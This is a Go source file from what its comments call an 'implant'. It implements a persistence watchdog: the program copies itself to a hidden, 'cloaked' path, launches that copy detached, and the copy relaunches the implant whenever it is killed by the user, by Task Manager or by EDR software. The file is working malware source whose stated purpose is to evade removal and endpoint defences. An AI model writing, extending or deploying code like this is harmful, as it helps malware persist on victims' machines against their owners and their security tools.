package main

import (
	"os"
	"strconv"
	"strings"
	"time"
)

// Watchdog.
//
// The implant drops a detached shadow copy of itself and hands it its own PID.
// The shadow does nothing but poll; if the implant is killed (Task Manager,
// EDR, crash) the shadow starts it again and exits, and the new instance arms
// its own watchdog. Both processes are the same binary, so there is no extra
// artefact to build or ship.

const watchdogArg = "--wd="

func watchdogPid() int {
	for _, a := range os.Args[1:] {
		if strings.HasPrefix(a, watchdogArg) {
			if n, err := strconv.Atoi(strings.TrimPrefix(a, watchdogArg)); err == nil {
				return n
			}
		}
	}
	return 0
}

func isWatchdog() bool { return watchdogPid() > 0 }

// ensureWatchdog arms the shadow copy once per process.
func ensureWatchdog() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	dst := freeCloakPath()
	if err := os.MkdirAll(dirOf(dst), 0755); err != nil {
		return
	}
	if err := copyFile(exe, dst); err != nil {
		return
	}
	os.Chmod(dst, 0755)
	hideFile(dst)

	c := newCmd(dst, watchdogArg+strconv.Itoa(os.Getpid()))
	detachCmd(c)
	c.Start()
}

// runWatchdog is the shadow's whole life: wait for the parent to vanish.
func runWatchdog() {
	pid := watchdogPid()
	if pid <= 0 {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	for i := 0; i < 5400; i++ { // ~6 h, then give up
		time.Sleep(4 * time.Second)
		if alive(pid) {
			continue
		}
		c := newCmd(exe)
		detachCmd(c)
		c.Start()
		time.Sleep(500 * time.Millisecond)
		return
	}
}

func dirOf(path string) string {
	if i := strings.LastIndexAny(path, `/\`); i > 0 {
		return path[:i]
	}
	return "."
}
